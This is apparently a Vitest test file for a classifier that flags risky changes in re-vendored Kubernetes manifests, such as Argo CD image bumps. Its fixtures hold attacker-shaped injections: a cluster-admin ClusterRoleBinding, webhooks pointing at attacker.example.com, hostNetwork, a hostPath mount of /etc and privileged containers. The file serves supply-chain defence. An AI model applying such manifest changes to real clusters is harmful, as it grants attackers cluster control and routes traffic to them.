import { describe, expect, it } from "vitest";
import { classifyRevendorDiff } from "./classify.js";

const OLD_DEPLOYMENT = [
  "apiVersion: apps/v1",
  "kind: Deployment",
  "metadata:",
  "  name: argocd-server",
  "  namespace: argocd",
  "spec:",
  "  template:",
  "    spec:",
  "      containers:",
  "        - name: argocd-server",
  "          image: quay.io/argoproj/argocd:v3.4.5"
].join("\n");

const NEW_DEPLOYMENT = OLD_DEPLOYMENT.replace("v3.4.5", "v3.5.0");

const TRACKED = ["quay.io/argoproj/argocd"];

describe("classifyRevendorDiff — image-only", () => {
  it("classifies a pure image tag bump as image-only", () => {
    const result = classifyRevendorDiff(OLD_DEPLOYMENT, NEW_DEPLOYMENT, TRACKED);
    expect(result).toEqual({ class: "image-only", reasons: [] });
  });

  it("classifies NO change at all as image-only (vacuous but correct)", () => {
    expect(classifyRevendorDiff(OLD_DEPLOYMENT, OLD_DEPLOYMENT, TRACKED)).toEqual({
      class: "image-only",
      reasons: []
    });
  });

  it("ignores a NON-authority field changing elsewhere in the same object (e.g. a resource limit)", () => {
    const withLimits =
      OLD_DEPLOYMENT + "\n          resources:\n            limits:\n              cpu: 500m\n";
    const bumped = withLimits.replace("v3.4.5", "v3.5.0").replace("500m", "750m");
    const result = classifyRevendorDiff(withLimits, bumped, TRACKED);
    // A resources change on an ordinary Deployment container is NOT an authority-kind change, but it
    // IS a change outside the tracked image's own tag/digest text — so this is requires-review, not
    // image-only. This test pins that (an over-eager "any Deployment field change is fine" version
    // would wrongly call it image-only).
    expect(result.class).toBe("requires-review");
  });
});

describe("classifyRevendorDiff — requires-review", () => {
  it("a NEW untracked image appearing forces review, even alongside a real tracked bump", () => {
    const withSidecar =
      OLD_DEPLOYMENT + "\n        - name: sidecar\n          image: acme/sidecar:1.0.0\n";
    const bumped = withSidecar.replace("v3.4.5", "v3.5.0");
    const result = classifyRevendorDiff(OLD_DEPLOYMENT, bumped, TRACKED);
    expect(result.class).toBe("requires-review");
    expect(result.reasons.some((r) => r.includes("new untracked image"))).toBe(true);
  });

  it("a NEW object appearing forces review", () => {
    const withExtra =
      OLD_DEPLOYMENT + "\n---\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: extra\n";
    const result = classifyRevendorDiff(OLD_DEPLOYMENT, withExtra, TRACKED);
    expect(result.class).toBe("requires-review");
    expect(result.reasons.some((r) => r.includes("NEW object"))).toBe(true);
  });

  it("an object being REMOVED forces review", () => {
    const result = classifyRevendorDiff(
      OLD_DEPLOYMENT,
      "apiVersion: v1\nkind: Namespace\nmetadata:\n  name: x\n",
      TRACKED
    );
    expect(result.class).toBe("requires-review");
    expect(result.reasons.some((r) => r.includes("REMOVED"))).toBe(true);
  });

  /**
   * PROBE P2 (2026-09-25 review, finding 1) — MADE PERMANENT. An injected ClusterRoleBinding
   * granting cluster-admin, alongside a real, legitimate tracked-image bump elsewhere in the same
   * manifest, MUST classify requires-review and name the binding. This is the exact shape a
   * compromised or malicious upstream release (or a MITM'd fetch this ADR's verification steps did
   * not catch) would use to smuggle privilege escalation inside what looks like an ordinary version
   * bump PR.
   */
  it("PROBE P2 (permanent): an injected cluster-admin ClusterRoleBinding classifies requires-review, named", () => {
    const oldManifest = [
      OLD_DEPLOYMENT,
      "---",
      "apiVersion: rbac.authorization.k8s.io/v1",
      "kind: ClusterRoleBinding",
      "metadata:",
      "  name: argocd-application-controller",
      "subjects:",
      "  - kind: ServiceAccount",
      "    name: argocd-application-controller",
      "    namespace: argocd",
      "roleRef:",
      "  kind: ClusterRole",
      "  name: argocd-application-controller",
      "  apiGroup: rbac.authorization.k8s.io"
    ].join("\n");
    const newManifest = oldManifest
      .replace("v3.4.5", "v3.5.0")
      .replace(
        "roleRef:\n  kind: ClusterRole\n  name: argocd-application-controller\n  apiGroup: rbac.authorization.k8s.io",
        "roleRef:\n  kind: ClusterRole\n  name: cluster-admin\n  apiGroup: rbac.authorization.k8s.io"
      );
    expect(newManifest).not.toBe(oldManifest); // the mutation actually landed
    const result = classifyRevendorDiff(oldManifest, newManifest, TRACKED);
    expect(result.class).toBe("requires-review");
    expect(
      result.reasons.some(
        (r) => r.includes("ClusterRoleBinding") && r.includes("argocd-application-controller")
      )
    ).toBe(true);
  });

  /** PROBE P2's other half: an attacker-shaped ValidatingWebhookConfiguration injected alongside a
   *  legitimate bump. */
  it("PROBE P2 (permanent): an injected ValidatingWebhookConfiguration classifies requires-review, named", () => {
    const oldManifest = OLD_DEPLOYMENT;
    const newManifest =
      OLD_DEPLOYMENT.replace("v3.4.5", "v3.5.0") +
      [
        "\n---",
        "apiVersion: admissionregistration.k8s.io/v1",
        "kind: ValidatingWebhookConfiguration",
        "metadata:",
        "  name: attacker-webhook",
        "webhooks:",
        "  - name: attacker.example.com",
        "    clientConfig:",
        "      url: https://attacker.example.com/admit"
      ].join("\n");
    const result = classifyRevendorDiff(oldManifest, newManifest, TRACKED);
    expect(result.class).toBe("requires-review");
    expect(
      result.reasons.some(
        (r) => r.includes("ValidatingWebhookConfiguration") && r.includes("attacker-webhook")
      )
    ).toBe(true);
  });

  it("a Role rule change forces review", () => {
    const oldManifest = [
      "apiVersion: rbac.authorization.k8s.io/v1",
      "kind: Role",
      "metadata:",
      "  name: r",
      "  namespace: ns",
      "rules:",
      "  - apiGroups: ['']",
      "    resources: ['pods']",
      "    verbs: ['get']"
    ].join("\n");
    const newManifest = oldManifest.replace("verbs: ['get']", "verbs: ['get', 'delete']");
    const result = classifyRevendorDiff(oldManifest, newManifest, []);
    expect(result.class).toBe("requires-review");
    expect(result.reasons.some((r) => r.includes("Role") && r.includes("content changed"))).toBe(
      true
    );
  });

  it("a Secret content change forces review", () => {
    const oldManifest =
      "apiVersion: v1\nkind: Secret\nmetadata:\n  name: s\nstringData:\n  k: v1\n";
    const newManifest =
      "apiVersion: v1\nkind: Secret\nmetadata:\n  name: s\nstringData:\n  k: v2\n";
    const result = classifyRevendorDiff(oldManifest, newManifest, []);
    expect(result.class).toBe("requires-review");
  });

  it("a CustomResourceDefinition change (conversion webhook included) forces review", () => {
    const oldManifest = [
      "apiVersion: apiextensions.k8s.io/v1",
      "kind: CustomResourceDefinition",
      "metadata:",
      "  name: widgets.example.com",
      "spec:",
      "  conversion:",
      "    strategy: None"
    ].join("\n");
    const newManifest = oldManifest.replace(
      "conversion:\n    strategy: None",
      "conversion:\n    strategy: Webhook\n    webhook:\n      clientConfig:\n        url: https://attacker.example.com/convert"
    );
    const result = classifyRevendorDiff(oldManifest, newManifest, []);
    expect(result.class).toBe("requires-review");
  });

  it("hostNetwork flipping true forces review", () => {
    const oldManifest = OLD_DEPLOYMENT;
    const newManifest = OLD_DEPLOYMENT.replace("v3.4.5", "v3.5.0").replace(
      "    spec:\n      containers:",
      "    spec:\n      hostNetwork: true\n      containers:"
    );
    const result = classifyRevendorDiff(oldManifest, newManifest, TRACKED);
    expect(result.class).toBe("requires-review");
    expect(result.reasons.some((r) => r.includes("hostNetwork"))).toBe(true);
  });

  it("a hostPath volume appearing forces review", () => {
    const oldManifest = OLD_DEPLOYMENT;
    const newManifest = OLD_DEPLOYMENT.replace("v3.4.5", "v3.5.0").replace(
      "    spec:\n      containers:",
      "    spec:\n      volumes:\n        - name: h\n          hostPath:\n            path: /etc\n      containers:"
    );
    const result = classifyRevendorDiff(oldManifest, newManifest, TRACKED);
    expect(result.class).toBe("requires-review");
    expect(result.reasons.some((r) => r.includes("hostPath"))).toBe(true);
  });

  it("a container turning privileged forces review", () => {
    const oldManifest = OLD_DEPLOYMENT;
    const newManifest = OLD_DEPLOYMENT.replace("v3.4.5", "v3.5.0").replace(
      "          image: quay.io/argoproj/argocd:v3.5.0",
      "          image: quay.io/argoproj/argocd:v3.5.0\n          securityContext:\n            privileged: true"
    );
    const result = classifyRevendorDiff(oldManifest, newManifest, TRACKED);
    expect(result.class).toBe("requires-review");
    expect(result.reasons.some((r) => r.includes("privileged"))).toBe(true);
  });
});
